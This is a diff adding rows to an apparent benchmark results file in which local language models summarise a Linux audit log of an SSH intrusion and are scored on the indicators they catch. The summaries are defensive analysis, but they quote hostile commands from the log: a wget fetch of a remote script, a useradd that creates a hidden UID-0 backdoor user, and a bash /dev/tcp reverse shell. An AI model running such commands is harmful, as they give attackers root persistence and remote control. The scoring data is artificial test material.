@@ -5,3 +5,71 @@ datetime,label,model,log,run,prompt_n,prompt_ms,prompt_tps,predicted_n,predicted
 2026-11-13T19:16:33,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,4008.8,1527.87,78,1181.4,65.18,5.19,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized SSH user named ""backup"" successfully authenticated from IP 203.0.113.45, gained root privileges via sudo, and executed a malicious script to create a new privileged user ""sysupd"" with root access. The attacker then created a cron job and an SSH key for this new user, deleted their own history file to cover tracks, and finally terminated the session."
 2026-11-13T19:16:38,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,3971.9,1542.09,67,1022.3,64.56,4.99,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","An unauthorized user (account ""backup"") successfully authenticated via SSH from IP 203.0.113.45 and executed a remote script to create a new ""sysupd"" user with root privileges and backdoor access. The attacker also modified system configuration files, deleted their own history, and attempted network connections before eventually disconnecting."
 2026-11-13T19:16:43,research1-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,3977.3,1539.98,82,1226.3,66.05,5.2,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log indicates a successful SSH login by a user named ""backup"" from IP 203.0.113.45, followed by a series of suspicious administrative actions performed with root privileges. The attacker executed commands to download a script from a remote server, created a new user named ""sysupd"" with root-level privileges, and attempted to modify system files such as cron jobs and SSH authorized keys."
+2026-11-13T20:30:13,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,35541.4,160.57,753,49638.1,15.15,85.18,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit Log Summary**
+
+1. **Brute‑force SSH attempts** – Several rapid `USER_AUTH` failures for the accounts **root** and **backup** from the same remote host (203.0.113.45).  
+
+2. **Successful login** – The `backup` account finally authenticates successfully (`res=success`) and a PAM session is opened (`USER_START`, `USER_LOGIN`).  
+
+3. **Post‑login activity (uid = 1003, auid = 1003)**  
+   - The attacker runs basic reconnaissance commands (`id`, `uname -a`) and reads `/etc/passwd`.  
+   - Using `sudo` they download a malicious script:  
+
+     ```
+     wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh
+     ```  
+
+   - The script is made executable (`chmod +x /tmp/.upd.sh`) and executed (`bash /tmp/.upd.sh`).  
+
+4. **Privilege escalation / persistence** – Inside the downloaded script the following actions are recorded:  
+   - Creation of a **root‑privileged user** `sysupd` (UID 0, GID 0) with a login shell (`/bin/bash`).  
+   - Insertion of a cron job (`/etc/cron.d/sysupd`) to ensure the script runs persistently.  
+   - Modification of `/root/.ssh/authorized_keys` (likely adding the attacker’s public key).  
+
+5. **Network connection attempt** – A failed `socket` syscall shows an attempted outbound connection to `198.51.100.23:4444` (typical reverse‑shell port).  
+
+6. **Cleanup** – The attacker deletes their command history file (`rm /home/backup/.bash_history`).  
+
+7. **Session termination** – The PAM session for `backup` is closed (`USER_END`, `USER_LOGOUT`).  
+
+8. **System housekeeping** – Normal `systemd-tmpfiles-clean` service start/stop events follow the intrusion, unrelated to the malicious activity.
+
+**Overall assessment** – The log shows a successful compromise of the `backup` account via SSH, followed by privilege escalation to root (creation of a UID‑0 user), persistence mechanisms (cron job, SSH authorized‑keys), and attempts to establish a remote connection. This is a classic post‑exploitation sequence and should be treated as a serious security incident. Immediate actions include:  
+
+- Blocking the offending IP (203.0.113.45).  
+- Revoking/rotating all SSH keys, especially those under `/root/.ssh/authorized_keys`.  
+- Removing the rogue user `sysupd` and the cron file `/etc/cron.d/sysupd`.  
+- Investigating `/tmp/.upd.sh` for additional payloads.  
+- Performing a full forensic review of the host for further backdoors."
+2026-11-13T20:31:44,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,35762.2,159.58,831,55486.8,14.96,91.25,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+1. **Brute‑force SSH attempts** – Several failed PAM authentication events for the *root* account from the external address 203.0.113.45, followed by a successful login as the non‑privileged user **backup** from the same IP.
+
+2. **Post‑login activity (user backup)** – After the login the user runs basic commands (`id`, `uname`, `cat /etc/passwd`) to enumerate the system.
+
+3. **Privilege escalation via sudo** – The *backup* user successfully uses `sudo` (as allowed by the PAM policy) to:
+   * Download a remote script `http://198.51.100.23/upd.sh` with `wget -q -O /tmp/.upd.sh`.
+   * Make the script executable (`chmod +x /tmp/.upd.sh`).
+   * Execute the script (`bash /tmp/.upd.sh`).
+
+4. **Malicious payload actions** – Inside the downloaded script (or subsequently) the attacker:
+   * Creates a new account **sysupd** with UID 0 (root) and a root home directory (`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`), effectively adding a hidden root‑level backdoor user.
+   * Writes a new cron file `/etc/cron.d/sysupd` (persistence).
+   * Accesses `/root/.ssh/authorized_keys` (likely to plant an SSH key for persistent remote access).
+   * Attempts a reverse shell to 198.51.100.23 on port 4444 (`bash -c ""bash -i >& /dev/tcp/198.51.100.23/4444 0>&1""`).
+
+5. **Cleanup** – The attacker deletes the `.bash_history` file in the *backup* home directory (`rm /home/backup/.bash_history`) to erase command traces.
+
+6. **Normal system activity** – The log ends with routine systemd‑tmpfiles‑clean service start/stop messages.
+
+**Overall assessment:** The log shows a successful compromise of the host via SSH brute‑force, privilege escalation through sudo, download and execution of malicious code, creation of a root‑level backdoor user, persistence via cron, an attempted reverse shell, and evidence of log‑hiding. Immediate incident response (isolate the host, rotate credentials, remove the rogue user/cron entry, inspect `/tmp/.upd.sh` and network connections) is required."
+2026-11-13T20:33:11,research1-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,35809.0,159.37,515,51351.1,10.01,87.16,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+- An external host (203.0.113.45) made a series of failed SSH login attempts for **root** and then successfully authenticated as the user **backup** (PID 47962, session 2).  
+- After login, the backup user enumerated the system (`id`, `uname`) and read `/etc/passwd`.  
+- Using **sudo**, the attacker downloaded a script from `http://198.51.100.23/upd.sh` to `/tmp/.upd.sh`, made it executable, and executed it with `bash`.  
+- The script created a new privileged account **sysupd** (UID 0, GID 0, login shell `/bin/bash`, home `/root`) and added a cron job (`/etc/cron.d/sysupd`) for persistence.  
+- The attacker also accessed the root SSH authorized‑keys file, likely to insert a malicious key, and attempted a direct network connection to `198.51.100.23:4444` (blocked by the audit).  
+- Finally, the attacker deleted their Bash history (`/home/backup/.bash_history`) and logged out, after which normal system services (systemd‑tmpfiles‑clean) continued.  
+
+**Overall impression:** a successful compromise via SSH, privilege escalation through sudo, download and execution of a malicious payload, creation of a root‑level backdoor user and cron job, and cleanup of evidence."
